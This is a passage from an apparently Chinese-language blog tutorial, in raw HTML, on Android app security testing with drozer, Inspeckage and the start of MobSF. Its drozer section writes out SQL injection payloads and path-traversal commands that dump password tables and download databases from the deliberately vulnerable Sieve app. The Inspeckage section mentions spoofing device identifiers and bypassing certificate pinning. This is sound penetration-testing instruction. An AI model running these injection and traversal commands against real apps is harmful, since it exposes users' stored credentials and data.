class=\"line\">drozer是一个全面的安全审计和攻击框架，可以进行更快的Android安全评估，通过自动化繁琐和耗时的工作，帮助减少Android安全评估所花费的时间。还可以针对真实的Android设备进行测试，drozer不需要启用USB调试或其他开发功能，还可以自动化和扩展，测试公共漏洞的暴露程度。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）安装准备\"><a href=\"#（2）安装准备\" class=\"headerlink\" title=\"（2）安装准备\"></a>（2）安装准备</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）drozer官方地址：https://labs.f-secure.com/tools/drozer/</span><br><span class=\"line\">（2）drozer github：https://github.com/mwrlabs/drozer</span><br><span class=\"line\">（3）下载及drozer用户手册：https://labs.mwrinfosecurity.com/tools/drozer/</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）安装\"><a href=\"#（3）安装\" class=\"headerlink\" title=\"（3）安装\"></a>（3）安装</h4><p>我们在这里主要列举Windows端和Linux端的安装：</p>\n<p><strong>1.Windows端：</strong></p>\n<p>我们在Windows安装时，首先需要配置环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">jdk1.8</span><br><span class=\"line\">python 2.7</span><br><span class=\"line\">android sdk</span><br><span class=\"line\">其中python的版本必须为2.7版本，因为drozer现在只支持python2.7版本</span><br></pre></td></tr></table></figure>\n\n<p>​\t我们先从官网上下载drozer（RPM）和agent.apk</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/5.png\" alt=\"image-20210902165138465\"></p>\n<p><strong>服务端安装：</strong></p>\n<p>我们下载drozer（RPM）后解压，然后点击setup安装，一路默认安装就可以了，它会自动安装到C:\\drozer文件夹下</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/6.png\" alt=\"image-20210902165138465\"></p>\n<p>我们检测是否成功安装，进入bin目录下，在cmd中执行drozer.bat，出现下面的图就说明成功安装了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/7.png\" alt=\"image-20210902165138465\"></p>\n<p><strong>客户端安装：</strong></p>\n<p>我们将agent.apk 安装到手机上：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb install agent.apk</span><br></pre></td></tr></table></figure>\n\n<p>安装完成后手机启动drozer，点击右下角开启端口转发按钮</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/8.png\" alt=\"image-20210902165138465\"></p>\n<p>然后我们在电脑的终端中输入命令转发端口：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb forward tcp:31415 tcp:31415 </span><br></pre></td></tr></table></figure>\n\n<p>最后我们在终端中进入drozer的安装目录下，输入命令运行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">drozer console connect</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/9.png\" alt=\"image-20210902165138465\"></p>\n<p>此时我们就可以正常使用drozer框架，来进行我们的测试工作了。</p>\n<p><strong>2.Linux端安装（Kali）</strong></p>\n<p>Linux上的安装因为需要的库比较多，所以很容易出错，大家最好按照这个步骤一步步来</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">首先，我们需要将python环境配置成python <span class=\"number\">2.7</span><span class=\"number\">.0</span></span><br><span class=\"line\">wget https://github.com/FSecureLABS/drozer/releases/download/<span class=\"number\">2.4</span><span class=\"number\">.4</span>/drozer-<span class=\"number\">2.4</span><span class=\"number\">.4</span>-py2-none-<span class=\"built_in\">any</span>.whl <span class=\"comment\">##下载drozer</span></span><br><span class=\"line\">apt-get --assume-yes install python-pip</span><br><span class=\"line\">pip2 install wheel</span><br><span class=\"line\">pip2 install pyyaml</span><br><span class=\"line\">pip2 install pyhamcrest</span><br><span class=\"line\">pip2 install protobuf </span><br><span class=\"line\">pip2 install pyopenssl </span><br><span class=\"line\">pip2 install twisted</span><br><span class=\"line\">pip2 install service_identity</span><br><span class=\"line\">pip2 install drozer-<span class=\"number\">2.4</span><span class=\"number\">.4</span>-py2-none-<span class=\"built_in\">any</span>.whl</span><br><span class=\"line\">安装jdk8: apt-get install --assume-yes openjdk-<span class=\"number\">8</span>-jdk-headless</span><br><span class=\"line\">安装adb: apt-get --assume-yes install adb <span class=\"comment\">##已经有adb不需要再次安装</span></span><br><span class=\"line\">下载客户端并安装：https://labs.f-secure.com/tools/drozer/</span><br><span class=\"line\">在客户端中打开<span class=\"number\">31415</span>端口，然后进行端口转发：</span><br><span class=\"line\">adb forward tcp:<span class=\"number\">31415</span> tcp:<span class=\"number\">31415</span></span><br><span class=\"line\">最后启动drozer：drozer console connect</span><br><span class=\"line\">参考网址：</span><br><span class=\"line\">https://blog.csdn.net/LoopherBear/article/details/<span class=\"number\">84030567</span></span><br><span class=\"line\">https://github.com/FSecureLABS/drozer/issues/<span class=\"number\">350</span></span><br><span class=\"line\">https://github.com/FSecureLABS/drozer/issues/<span class=\"number\">357</span><span class=\"comment\">#issuecomment-652669536</span></span><br></pre></td></tr></table></figure>\n\n<p>一些drozer安装常规问题解决方案：<a href=\"https://blog.csdn.net/Jession_Ding/article/details/82528142\">https://blog.csdn.net/Jession_Ding/article/details/82528142</a></p>\n<h4 id=\"（4）基本使用\"><a href=\"#（4）基本使用\" class=\"headerlink\" title=\"（4）基本使用\"></a>（4）基本使用</h4><p>drozer的一些常用指令：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; list  <span class=\"comment\">//列出目前可用的模块，也可以使用ls</span></span><br><span class=\"line\">&gt; help app.activity.forintent       <span class=\"comment\">//查看指定模块的帮助信息</span></span><br><span class=\"line\">&gt; run app.<span class=\"keyword\">package</span>.list      <span class=\"comment\">//列出android设备中安装的app</span></span><br><span class=\"line\">&gt; run app.<span class=\"keyword\">package</span>.info -a com.android.browser       <span class=\"comment\">//查看指定app的基本信息</span></span><br><span class=\"line\">&gt; run app.activity.info -a com.android.browser      <span class=\"comment\">//列出app中的activity组件</span></span><br><span class=\"line\">&gt; run app.activity.start --action android.intent.action.VIEW --data-uri  http:<span class=\"comment\">//www.google.com  //开启一个activity，例如运行浏览器打开谷歌页面</span></span><br><span class=\"line\">&gt; run scanner.provider.finduris -a com.sina.weibo       <span class=\"comment\">//查找可以读取的Content Provider</span></span><br><span class=\"line\">&gt; run  app.provider.query content:<span class=\"comment\">//settings/secure --selection &quot;name=&#x27;adb_enabled&#x27;&quot;    //读取指定Content Provider内容</span></span><br><span class=\"line\">&gt; run scanner.misc.writablefiles --privileged /data/data/com.sina.weibo     <span class=\"comment\">//列出指定文件路径里全局可写/可读的文件</span></span><br><span class=\"line\">&gt; run shell.start       <span class=\"comment\">//shell操作</span></span><br><span class=\"line\">&gt; run tools.setup.busybox       <span class=\"comment\">//安装busybox</span></span><br><span class=\"line\">&gt; list auxiliary        <span class=\"comment\">//通过web的方式查看content provider组件的相关内容</span></span><br><span class=\"line\">&gt; help auxiliary.webcontentresolver     <span class=\"comment\">//webcontentresolver帮助</span></span><br><span class=\"line\">&gt; run auxiliary.webcontentresolver      <span class=\"comment\">//执行在浏览器中以http://localhost:8080即可访问</span></span><br><span class=\"line\">以sieve示例</span><br><span class=\"line\">&gt; run app.<span class=\"keyword\">package</span>.list -f sieve         <span class=\"comment\">//查找sieve应用程序</span></span><br><span class=\"line\">&gt; run app.<span class=\"keyword\">package</span>.info -a com.mwr.example.sieve         <span class=\"comment\">//显示app.package.info命令包的基本信息</span></span><br><span class=\"line\">&gt; run app.<span class=\"keyword\">package</span>.attacksurface com.mwr.example.sieve   <span class=\"comment\">//确定攻击面</span></span><br><span class=\"line\">&gt; run app.activity.info -a com.mwr.example.sieve         <span class=\"comment\">//获取activity信息</span></span><br><span class=\"line\">&gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     <span class=\"comment\">//启动pwlist</span></span><br><span class=\"line\">&gt; run app.provider.info -a com.mwr.example.sieve        <span class=\"comment\">//提供商信息</span></span><br><span class=\"line\">&gt; run scanner.provider.finduris -a com.mwr.example.sieve        <span class=\"comment\">//扫描所有能访问地址</span></span><br><span class=\"line\">&gt; run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/--vertical  //查看DBContentProvider/Passwords这条可执行地址</span></span><br><span class=\"line\">&gt; run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;   //检测注入</span></span><br><span class=\"line\">&gt; run app.provider.read content:<span class=\"comment\">//com.mwr.example.sieve.FileBackupProvider/etc/hosts    //查看读权限数据</span></span><br><span class=\"line\">&gt; run app.provider.download content:<span class=\"comment\">//com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db //下载数据</span></span><br><span class=\"line\">&gt; run scanner.provider.injection -a com.mwr.example.sieve       <span class=\"comment\">//扫描注入地址</span></span><br><span class=\"line\">&gt; run scanner.provider.traversal -a com.mwr.example.sieve</span><br><span class=\"line\">&gt; run app.service.info -a com.mwr.example.sieve         <span class=\"comment\">//查看服务</span></span><br></pre></td></tr></table></figure>\n\n<p>我们在测试过程中，常用测试指令：</p>\n<p>四大组件模块：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>)Activity:</span><br><span class=\"line\">app.activity.forintent -- 找到可以处理已指定的包</span><br><span class=\"line\">app.activity.info -- 获取activity组件信息</span><br><span class=\"line\">app.activity.start -- 开启activity组件</span><br><span class=\"line\">scanner.activity.browsable -- 获取可从web浏览器调用的所有可浏览的activity组件</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"number\">2</span>)Service:</span><br><span class=\"line\">app.service.info -- 获取service组件信息</span><br><span class=\"line\">app.service.send -- 向服务组件发送消息并显示答复</span><br><span class=\"line\">app.service.start -- 开启service组件</span><br><span class=\"line\">app.service.stop -- 停止service组件</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"number\">3</span>)Content Provider:</span><br><span class=\"line\">app.provider.columns -- 在内容提供程序中列出列</span><br><span class=\"line\">app.provider.delete -- 在内容提供程序中删除</span><br><span class=\"line\">app.provider.download -- 在内容提供程序中下载支持文件</span><br><span class=\"line\">app.provider.finduri -- 在包中查找引用的内容URIS</span><br><span class=\"line\">app.provider.info -- 获取Content Provider组件信息</span><br><span class=\"line\">app.provider.insert -- 插入到Content Provider组件中</span><br><span class=\"line\">app.provider.query -- 查询Content Provider组件</span><br><span class=\"line\">app.provider.read -- 从支持文件的Content Provider读取</span><br><span class=\"line\">app.provider.update -- 更新Content Provider的记录</span><br><span class=\"line\">scanner.provider.finduris -- 搜索可从上下文中查询的Content Provider</span><br><span class=\"line\">scanner.provider.injection -- 测试Content Provider的注入漏洞</span><br><span class=\"line\">scanner.provider.sqltables -- 查找可通过SQL注入漏洞访问的表</span><br><span class=\"line\">scanner.provider.traversal -- 测试Content Provider的基本目录遍历漏洞</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"number\">4</span>)Broadcast Receivers:</span><br><span class=\"line\">app.broadcast.info -- 获取有关广播接收器的信息</span><br><span class=\"line\">app.broadcast.send -- 带目的发送广播</span><br><span class=\"line\">app.broadcast.sniff -- 注册一个能嗅出特定意图的广播接收器</span><br></pre></td></tr></table></figure>\n\n<p>获取APP包信息：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">app.<span class=\"keyword\">package</span>.attacksurface------获取包攻击面</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"keyword\">package</span>.backup------列出使用备份API的包(在标记“允许备份”时返回<span class=\"literal\">true</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"keyword\">package</span>.debuggable------查找可调试包</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"keyword\">package</span>.info------获取有关已安装软件包的信息</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"keyword\">package</span>.launchintent------获取包的启动意图</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"keyword\">package</span>.list------列出程序包</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"keyword\">package</span>.manifest------获取包的AndroidManifest.xml</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"keyword\">package</span>.<span class=\"keyword\">native</span>------查找嵌入在应用程序中的本地库</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"keyword\">package</span>.shareduid------查找具有共享uid的包</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>连接drozer：</span><br><span class=\"line\">drozer.bat console connect</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>列出详细APP信息：</span><br><span class=\"line\">run app.<span class=\"keyword\">package</span>.info -a com.xxx.xxxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span>查看APP的配置信息</span><br><span class=\"line\">run app.<span class=\"keyword\">package</span>.manifest com.xxx.xxxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span>分析是否存在攻击攻击点</span><br><span class=\"line\">run app.<span class=\"keyword\">package</span>.attacksurface com.xxx.xxxx</span><br><span class=\"line\"></span><br><span class=\"line\">==============================================</span><br><span class=\"line\">Activity测试：</span><br><span class=\"line\"><span class=\"number\">4.</span>获取Activity信息</span><br><span class=\"line\">命令 run app.activity.info -a</span><br><span class=\"line\">示例 run app.activity.info -a com.xxx.xxxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">5.</span>Activity跳转</span><br><span class=\"line\">命令：run app.activity.start --component 软件包名 软件包名.对应exported的activtiy</span><br><span class=\"line\">示例：run app.activity.start --component com.example.test com.example.test.Activity</span><br><span class=\"line\"></span><br><span class=\"line\">==============================================</span><br><span class=\"line\">Service测试：</span><br><span class=\"line\"><span class=\"number\">6.</span>获取service信息</span><br><span class=\"line\">命令 run app.service.info -a</span><br><span class=\"line\">示例 run app.service.info -a com.xxx.xxxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">7.</span>发送service服务</span><br><span class=\"line\">命令：run app.service.start --component 软件包名 软件包名.对应exported的activtiy --extra 数据</span><br><span class=\"line\">示例：run app.service.start --component com.example.test com.example.test.Activity --extra string phone <span class=\"number\">12345678901</span> --extra string content Hello</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">7</span>-<span class=\"number\">1.</span>调用服务组件</span><br><span class=\"line\">命令：run app.service.start --action 服务名 --component 包名 服务名</span><br><span class=\"line\">示例：run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component </span><br><span class=\"line\">org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService</span><br><span class=\"line\"></span><br><span class=\"line\">==============================================</span><br><span class=\"line\">Broadcast Receivers测试： </span><br><span class=\"line\"><span class=\"number\">8.</span>获取Broadcast信息</span><br><span class=\"line\">命令 run app.broadcast.info -a</span><br><span class=\"line\">示例 run app.broadcast.info -a com.xxx.xxxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">9.</span>注册一个能嗅出特定意图的广播接收器</span><br><span class=\"line\">命令：app.broadcast.sniff --action <span class=\"string\">&quot;活动&quot;</span></span><br><span class=\"line\">示例：app.broadcast.sniff --action <span class=\"string\">&quot;ddns.actiton.Token&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"number\">10.</span>发送广播</span><br><span class=\"line\">命令：run app.broadcast.send --action 广播名 --extra string name lisi</span><br><span class=\"line\">示例：run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber <span class=\"number\">1234</span> --extra string message dog</span><br><span class=\"line\"></span><br><span class=\"line\">==============================================</span><br><span class=\"line\">contentProvider测试：</span><br><span class=\"line\"><span class=\"number\">11.</span>获取contentProvider信息</span><br><span class=\"line\">命令：run app.provider.info -a</span><br><span class=\"line\">示例：run app.provider.info -a com.xxx.xxxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">12.</span>获取所有可访问的Uri</span><br><span class=\"line\">命令 run scanner.provider.finduris -a</span><br><span class=\"line\">示例 run scanner.provider.finduris -a com.xxx.xxxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">13.</span>检测SQL注入</span><br><span class=\"line\">命令 run scanner.provider.injection -a</span><br><span class=\"line\">示例 run scanner.provider.injection -a com.xxx.xxxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">14.</span>检测目录遍历</span><br><span class=\"line\">命令 run scanner.provider.traversal -a</span><br><span class=\"line\">示例 run scanner.provider.traversal -a com.xxx.xxxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">15.</span>进行SQL注入</span><br><span class=\"line\">命令 run app.provider.query [--projection] [--selection]</span><br><span class=\"line\">示例 run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/</span></span><br><span class=\"line\"></span><br><span class=\"line\">列出所有表 run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br><span class=\"line\">获取单表（如Key）的数据 run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">16.</span>读取文件系统下的文件</span><br><span class=\"line\">示例 run app.provider.read content:<span class=\"comment\">//com.mwr.example.sieve.FileBackupProvider/etc/hosts</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">17.</span>下载数据库文件到本地</span><br><span class=\"line\">示例 run app.provider.download content:<span class=\"comment\">//com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db d:/database.db</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Inspeckage-xposed\"><a href=\"#2-Inspeckage-xposed\" class=\"headerlink\" title=\"2.Inspeckage(xposed)\"></a>2.Inspeckage(xposed)</h3><h4 id=\"（1）Inspeckage介绍\"><a href=\"#（1）Inspeckage介绍\" class=\"headerlink\" title=\"（1）Inspeckage介绍\"></a>（1）Inspeckage介绍</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Inspeckage是一个用来动态分析安卓app的xposed模块。Inspeckage对动态分析很多常用的功能进行了汇总并且内建一个webserver。整个分析操作可以在友好的界面环境中进行。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）安装准备-1\"><a href=\"#（2）安装准备-1\" class=\"headerlink\" title=\"（2）安装准备\"></a>（2）安装准备</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Xposed框架安装</span><br><span class=\"line\">Inspeckage模块网址：http:<span class=\"comment\">//repo.xposed.info/module/mobi.acpm.inspeckage  //也可以直接到Xposed模块库中搜索</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Xposed框架安装：</span><br><span class=\"line\">（<span class=\"number\">1</span>）<span class=\"number\">4.4</span>以下Android版本安装比较简单，只需要两步即可</span><br><span class=\"line\">\t<span class=\"number\">1.</span>对需要安装Xposed的手机进行root</span><br><span class=\"line\">\t<span class=\"number\">2.</span>下载并安装xposedInstaller,之后授权其root权限，进入app点击安装即可</span><br><span class=\"line\">    但是由于官网不在维护，导致无法直接通过xposedinstaller下载补丁包</span><br><span class=\"line\">（<span class=\"number\">2</span>）Android <span class=\"number\">5.0</span>-<span class=\"number\">8.0</span> 由于<span class=\"number\">5.0</span>后出现ART，所以安装步骤分成两个部分：xposed.zip 和 </span><br><span class=\"line\">    XposedInstaller.apk,zip文件是框架主体，需要进入Recovery后刷入，apk文件用于Xposed管理</span><br><span class=\"line\">    <span class=\"number\">1.</span>完成对手机的root，并刷入reconvery(比如twrp),使用Superroot</span><br><span class=\"line\">    <span class=\"number\">2.</span>下载你对应的zip补丁包，并进入recovery刷入</span><br><span class=\"line\">    <span class=\"number\">3.</span>重启手机，安装xposedInstaller并授予root权限即可</span><br><span class=\"line\">    官网地址：https:<span class=\"comment\">//dl-xda.xposed.info/framework/</span></span><br><span class=\"line\">（<span class=\"number\">3</span>）由于Android <span class=\"number\">8.0</span>后，Xposed官方作者没有再对其更新，我们一般就使用国内大佬riyu的Edxposed框架</span><br><span class=\"line\">\tMagisk + riyu + Edxposed</span><br><span class=\"line\">\t具体安装过程，大家百度搜索</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）安装-1\"><a href=\"#（3）安装-1\" class=\"headerlink\" title=\"（3）安装\"></a>（3）安装</h4><p>我们先下载安装Inspeckage模块，在xposed中勾选：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/10.png\" alt=\"image-20210903094058509\"></p>\n<p>然后手机重启，激活Xposed中该模块，就完成正常的安装了</p>\n<h4 id=\"（4）基本使用-1\"><a href=\"#（4）基本使用-1\" class=\"headerlink\" title=\"（4）基本使用\"></a>（4）基本使用</h4><p><strong>客户端：</strong></p>\n<p>我们进入Inspeckage应用程序，可以配置其相关的信息：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/11.png\" alt=\"image-20210903094433733\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(1)序号1 Only user app : 默认只显示用户安装的APP,关闭可以显示系统自带的APP</span><br><span class=\"line\">(2)序号2 选择准备要测试的APP列表，这里是我们测试的目标APP</span><br><span class=\"line\">(3)序号3 表示我们的Inspeckage模块是否启动，如果这里为红色，说明可能没有安装Xposed框架，或者没有启动Inspeckage模块</span><br><span class=\"line\">(4)序号4 上面为我们手机的局域网地址，下面为我们USB访问的地址，也是我们电脑上主界面访问地址</span><br><span class=\"line\">(5)序号5 我们在访问主界面前，需要进行端口转发</span><br><span class=\"line\">(6)序号6 启动对应APP 我们可以在主界面查看其相关信息</span><br></pre></td></tr></table></figure>\n\n<p>我们查看APP的配置界面：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/12.png\" alt=\"image-20210903095543175\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）序号1 我们连接的地址，我们可以全选，也可以设置成手机局域网或主机地址，这样我们在主界面访问时就需要输入对应ip地址</span><br><span class=\"line\">（2）序号2 服务端端口号 序号3 Web套接字端口号  我们对端口号可以自定义</span><br></pre></td></tr></table></figure>\n\n<p>客户端使用步骤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）我们首先在choose target中选择目标应用程序，然后我们点击Launch，启动该目标程序</span><br><span class=\"line\">（<span class=\"number\">2</span>）然后我们进行端口转发,转发手机的<span class=\"number\">8008</span>端口到本地：adb forward tcp:<span class=\"number\">8008</span> tcp:<span class=\"number\">8008</span></span><br><span class=\"line\">（<span class=\"number\">3</span>）接着我们在电脑上访问 http:<span class=\"comment\">//127.0.0.1:8008 就可以看到Inspeckage的web界面。(如果web也买你没有输出结果，查看APP is running是否为true，Logcat左边分那个自动刷新按钮是否开启)</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>服务端：</strong></p>\n<p>我们在电脑上访问 <a href=\"http://127.0.0.1:8008，就可以进入服务端的web界面\">http://127.0.0.1:8008，就可以进入服务端的web界面</a></p>\n<p>首先我们来介绍Tag界面：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/13.png\" alt=\"image-20210903102447120\"></p>\n<p>Data dir：数据文件树</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/22.png\" alt=\"image-20210903111658205\"></p>\n<p>主要提供我们APP运行过程中一些数据存储的位置</p>\n<p>主界面的各字段含义依次为：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Logcat                               实时查看该app的logcat输出</span><br><span class=\"line\">Tree View                         可以实时浏览app的数据目录并直接下载文件到本地</span><br><span class=\"line\">Package Information     应用基本信息（组件信息、权限信息、共享库信息）</span><br><span class=\"line\">Shared Preferences       LOG：app XML文件读写记录；Files：具体XML写入内容</span><br><span class=\"line\">Serialization                     反序列化记录</span><br><span class=\"line\">Crypto                                常见加解密记录（KEY、IV值）</span><br><span class=\"line\">Hash                                 常见的哈希算法记录</span><br><span class=\"line\">SQLite                               SQLite数据库操作记录</span><br><span class=\"line\">HTTP                                 HTTP网络请求记录</span><br><span class=\"line\">File System                      文件读写记录</span><br><span class=\"line\">Misc.                                  调用Clipboard,URL.Parse()记录</span><br><span class=\"line\">WebView                          调用webview内容                  </span><br><span class=\"line\">IPC                                     进程之间通信记录</span><br><span class=\"line\">+Hooks                             运行过程中用户自定义Hook记录</span><br><span class=\"line\">参考网址：https:<span class=\"comment\">//blog.csdn.net/tom__chen/article/details/78216732</span></span><br></pre></td></tr></table></figure>\n\n<p>我们进入设置界面：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/14.png\" alt=\"image-20210903102929233\"></p>\n<p>Replace界面：</p>\n<p>Replace界面主要是用来替换hook的方法参数和返回值的，所以我们顺便看一下hook界面</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/15.png\" alt=\"image-20210903104608694\"></p>\n<p>点击新建hook界面</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/16.png\" alt=\"image-20210903104836048\"></p>\n<p>点击替换界面</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/17.png\" alt=\"image-20210903105411393\"></p>\n<p>Location界面：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/18.png\" alt=\"image-20210903110455725\"></p>\n<p>这里官方是指可以替换GPS位置信息，不过平时在使用过程中用的并不多</p>\n<p>Fingerprint（指纹信息）界面：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/19.png\" alt=\"image-20210903110919960\"></p>\n<p>这个功能界面还是十分强大的，我们可以在这里替换一些我们设备常见的参数值，这样可以在我们进行一些测试工作的时候，可以绕过一些检测，比如我们可以更改IMEI、IMSI等等</p>\n<p>Tip界面：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/20.png\" alt=\"image-20210903111131879\"></p>\n<p>这里主要是介绍我们在Android分析操作过程中的一些检测方法，一些例子</p>\n<p>Logcat界面：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/21.png\" alt=\"image-20210903111341868\"></p>\n<p>这里主要提供我们在程序运行过程中的一些日志信息，和我们ddms的作用一致</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">总结：</span><br><span class=\"line\">\tInspeckage是一款功能强大的Android安全测试工具，为用户提供了可视化的UI界面，很大程度上帮助用户去进行测试工作，可以对APP应用的基本配置信息进行检测，而且还可以提供用户简单的hook操作，用户可以很方便并且可视化的进行一些hook操作，还可以去修改设备和设备上应用程序的很多基本属性，还可以添加代理，绕过一些证书的固定。</span><br><span class=\"line\">参考网址：</span><br><span class=\"line\">\t官方网址：https:<span class=\"comment\">//github.com/ac-pm/Inspeckage#information-gathering</span></span><br><span class=\"line\">\t\t\thttps:<span class=\"comment\">//repo.xposed.info/module/mobi.acpm.inspeckage</span></span><br><span class=\"line\">\t博客网址：https:<span class=\"comment\">//blog.csdn.net/tom__chen/article/details/78216732</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-MobSF\"><a href=\"#3-MobSF\" class=\"headerlink\" title=\"3.MobSF\"></a>3.MobSF</h3><h4 id=\"（1）MobSF基本介绍\"><a href=\"#（1）MobSF基本介绍\" class=\"headerlink\" title=\"（1）MobSF基本介绍\"></a>（1）MobSF基本介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">移动安全框架（MobSF）是一种自动化的移动应用程序（Android / iOS / Windows）测试框架，能够执行静态，动态和恶意软件分析。 它可用于 Android，iOS 和 Windows 移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA 和 APPX）和压缩源代码。 MobSF 可以在运行时为 Android 应用程序进行动态应用程序测试，并具有由 CapFuzz（一种特定于 Web API 的安全扫描程序）提供支持的 Web API 模糊测试。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）安装准备-2\"><a href=\"#（2）安装准备-2\" class=\"headerlink\" title=\"（2）安装准备\"></a>（2）安装准备</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">安装MobSF一般有两种方式，一种是使用drozer安装，另外是使用源码安装，我们这里仅显示源码安装案例</span><br><span class=\"line\">官方地址：https://github.com/MobSF/Mobile-Security-Framework-MobSF</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）安装-2\"><a href=\"#（3）安装-2\" class=\"headerlink\" title=\"（3）安装\"></a>（3）安装</h4><p><strong>Windows安装：</strong></p>\n<p>安装环境</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Windows10</span><br><span class=\"line\">Python 3.7</span><br><span 